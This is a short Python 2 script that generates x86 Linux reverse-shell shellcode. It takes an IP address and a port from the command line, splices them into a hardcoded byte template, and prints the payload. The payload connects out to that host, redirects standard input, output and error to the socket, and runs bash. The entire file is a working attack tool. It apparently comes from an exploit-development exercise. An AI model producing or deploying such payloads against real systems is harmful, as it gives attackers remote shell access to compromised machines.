#!/usr/bin/python
import sys

def ip2int(ip):
    o = map(int, ip.split('.'))
    res = (16777216 * o[0]) + (65536 * o[1]) + (256 * o[2]) + o[3]
    return res


def int2ip(ipnum):
    o1 = int(ipnum / 16777216) % 256
    o2 = int(ipnum / 65536) % 256
    o3 = int(ipnum / 256) % 256
    o4 = int(ipnum) % 256
    return '%(o1)s.%(o2)s.%(o3)s.%(o4)s' % locals()


shellcode_start = "\\x31\\xc9\\x89\\xc8\\xb0\\x66\\x89\\xcb\\xb3\\x01\\x51\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc2\\x31\\xc9\\x89\\xc8\\xb0\\x66\\x89\\xcb\\xb3\\x03\\x68"
shellcode_ip = "\\x7f\\x01\\x01\\x01" #ip 127.1.1.1
shellcode_middle = "\\x66\\x68"
shellcode_port = "\\x04\\xd2" #1234
shellcode_end = "\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x52\\x89\\xe1\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x89\\xd3\\x31\\xc9\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x89\\xd3\\x31\\xc9\\xb1\\x01\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x89\\xd3\\x31\\xc9\\xb1\\x02\\xcd\\x80\\x31\\xc0\\xb0\\x0b\\x31\\xc9\\x51\\x68\\x62\\x61\\x73\\x68\\x68\\x62\\x69\\x6e\\x2f\\x68\\x2f\\x2f\\x2f\\x2f\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xcd\\x80"

if len(sys.argv) == 3:
	port_number = int(sys.argv[2])
	#port_number = 1234
	port_str =  "{0:0{1}x}".format(port_number,4)
	shellcode_port =  "\\x" + port_str[0] + port_str[1] + "\\x" + port_str[2] + port_str[3]

	ip_number = ip2int(sys.argv[1])
	ip_str = "{0:0{1}x}".format(ip_number,8)
	shellcode_ip = "\\x" + ip_str[0] + ip_str[1] + "\\x" + ip_str[2] + ip_str[3] + "\\x" + ip_str[4] + ip_str[5] + "\\x" + ip_str[6] + ip_str[7]
#	print ip_str


#print "DEBUG IP   " + shellcode_ip
#print "DEBUG PORT " + shellcode_port

print shellcode_start + shellcode_ip + shellcode_middle + shellcode_port + shellcode_end
